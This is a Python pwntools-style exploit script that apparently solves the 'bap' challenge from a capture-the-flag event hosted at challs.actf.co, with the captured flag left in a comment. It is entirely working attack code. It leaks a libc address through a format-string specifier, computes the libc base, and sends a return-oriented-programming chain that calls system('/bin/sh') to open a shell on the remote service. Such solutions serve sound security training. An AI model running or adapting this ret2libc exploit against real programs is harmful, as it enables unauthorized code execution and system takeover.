#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './bap'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False, 'gdbscript':''}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'challs.actf.co', 'port':31323})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc.so.6')
env.select()

#==========

binf = ELF(bin_file)
addr_main           = binf.sep_function['main']

libc = ELF(env.libc) if env.libc else binf.libc
ofs_libc_stdin          = libc.symbols['_IO_2_1_stdin_']

#==========

def attack(conn, **kwargs):
    rop = ROP(binf)
    rop.call(rop.ret.address)
    rop.main()

    exploit  = b'%3$p!'
    exploit  = exploit.ljust(0x18, b'\x00')
    exploit += bytes(rop)

    conn.sendlineafter(b': ', exploit)
    addr_libc_stdin = int(conn.recvuntil(b'!', drop=True), 16)
    libc.address = addr_libc_stdin - ofs_libc_stdin
    info('addr_libc_base    = 0x{:012x}'.format(libc.address))
    addr_libc_str_sh    = next(libc.search(b'/bin/sh'))

    rop = ROP(libc)
    rop.call(rop.ret.address)
    rop.system(addr_libc_str_sh)
    conn.sendlineafter(b': ', b'\x00'*0x18 + bytes(rop))

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.interactive()
    # actf{baaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaap____}

if __name__=='__main__':
    main()

#==========
